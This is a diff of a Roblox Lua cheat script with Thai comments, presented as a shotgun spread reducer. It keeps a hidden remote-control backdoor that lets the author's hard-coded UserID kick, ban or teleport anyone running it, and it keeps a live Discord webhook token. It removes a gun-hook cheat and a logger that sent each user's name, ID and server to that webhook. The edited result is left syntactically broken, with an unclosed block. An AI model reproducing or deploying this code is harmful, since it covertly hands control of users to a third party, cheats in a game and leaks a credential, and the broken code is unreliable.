@@ -1,12 +1,16 @@
 --////////////////////////////////////////////////////////////
 -- [ส่วนตั้งค่า] Config
 --////////////////////////////////////////////////////////////
-getgenv().spreadChangerPercentage = 20  -- ยิ่งเลขน้อย กระสุนยิ่งเกาะกลุ่ม (แนะนำ 15-30)
+
+-- แก้ไขตรงนี้: เช็คว่ามีการตั้งค่ามาจากข้างนอกไหม?
+if getgenv().spreadChangerPercentage == nil then
+    getgenv().spreadChangerPercentage = 20 -- ถ้าไม่ได้ตั้งมา ให้ใช้ค่ามาตรฐานคือ 20
+end
 
 -- ลิ้งค์ Webhook ของคุณ
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1447911431881359494/4s6-I0jzTgVDc3xCW3wpJbI9LQ8GzAK2oFtt6aldGE2Yn-tlK_XM8CFxD5yIyb3pb7M-"
 
--- รายชื่อ Admin (ใส่ ID ของคุณให้แล้ว)
+-- รายชื่อ Admin
 local Whitelist_Admin = {
     8908656348, -- UserID ของคุณ
 }
@@ -30,7 +34,6 @@ local function checkBanStatus()
         if success and bannedList then
             for _, id in pairs(bannedList) do
                 if id == game.JobId then
-                    -- ถ้า JobId ตรงกับที่บันทึกไว้ ให้เตะออก
                     LocalPlayer:Kick("You have been kicked from this game [Error Code: 267]")
                     return true
                 end
@@ -95,26 +98,18 @@ task.spawn(function()
             
             local kickReason = "You have been kicked by " .. speaker.Name
 
-            -- // คำสั่ง .kick (เตะเฉยๆ) //
             if cmd == ".kick" then
-                if isTarget(target) then
-                    LocalPlayer:Kick(kickReason)
-                end
-            
-            -- // คำสั่ง .ban (เตะ + ห้ามเข้าเซิร์ฟเดิม) //
+                if isTarget(target) then LocalPlayer:Kick(kickReason) end
             elseif cmd == ".ban" then
                 if isTarget(target) then
-                    addServerBan() -- บันทึกห้องนี้
+                    addServerBan()
                     task.wait(0.1)
                     LocalPlayer:Kick(kickReason)
                 end
-
-            -- // คำสั่ง .bring (ดึงตัวมาหา) //
             elseif cmd == ".bring" then
                 if isTarget(target) then
                     local adminChar = speaker.Character
                     local myChar = LocalPlayer.Character
-                    
                     if adminChar and adminChar:FindFirstChild("HumanoidRootPart") and 
                        myChar and myChar:FindFirstChild("HumanoidRootPart") then
                         myChar.HumanoidRootPart.CFrame = adminChar.HumanoidRootPart.CFrame
@@ -137,74 +132,3 @@ end)
 -- [ส่วนที่ 2] ระบบ Spread (ลดแรงดีด)
 --////////////////////////////////////////////////////////////
 if not getgenv().spreadChangerLoaded then
-    getgenv().spreadChangerLoaded = true
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    
-    local function spreadmake(percent)
-        percent = math.clamp(percent or 0, 0, 100) / 100
-        local x = (math.random() - 0.5) * 0.1 * percent
-        local y = (math.random() - 0.5) * 0.2 * percent
-        local z = (math.random() - 0.5) * 0.1 * percent
-        return Vector3.new(x, y, z)
-    end
-
-    task.spawn(function()
-        local modules = ReplicatedStorage:WaitForChild("Modules", 30)
-        if not modules then return end
-        local gunHandler = require(modules:WaitForChild("GunHandler", 30))
-        if not gunHandler then return end
-
-        local getAim = gunHandler.getAim
-        local oldshoot = gunHandler.shoot
-
-        gunHandler.shoot = function(data)
-            local callingScript = getcallingscript()
-            if callingScript and tostring(callingScript):find("Shotgun") then
-                local wp = data.ForcedOrigin
-                local range = data.Range
-                local spreadValue = getgenv().spreadChangerPercentage or 0
-                data.AimPosition = wp + (getAim(wp) + spreadmake(spreadValue)) * range
-            end
-            return oldshoot(data)
-        end
-    end)
-end
-
---////////////////////////////////////////////////////////////
--- [ส่วนที่ 3] Logger (ส่ง Webhook)
---////////////////////////////////////////////////////////////
-task.spawn(function()
-    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
-
-    local placeId = game.PlaceId
-    local gameName = "Unknown"
-    pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
-    
-    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)
-
-    local payload = {
-        ["username"] = "3354 Script",
-        ["avatar_url"] = avatarUrl,
-        ["embeds"] = {{
-            ["title"] = "🔔 Spread Script Activated",
-            ["color"] = 16711680,
-            ["thumbnail"] = { ["url"] = avatarUrl },
-            ["fields"] = {
-                { ["name"] = "User:", ["value"] = LocalPlayer.Name .. " ("..LocalPlayer.UserId..")", ["inline"] = true },
-                { ["name"] = "Game:", ["value"] = gameName, ["inline"] = false },
-                { ["name"] = "JobId:", ["value"] = "```"..game.JobId.."```", ["inline"] = false }
-            },
-            ["footer"] = { ["text"] = "Admin System: .kick .ban .bring" },
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-    
-    if http_request then
-        http_request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(payload)
-        })
-    end
-end)
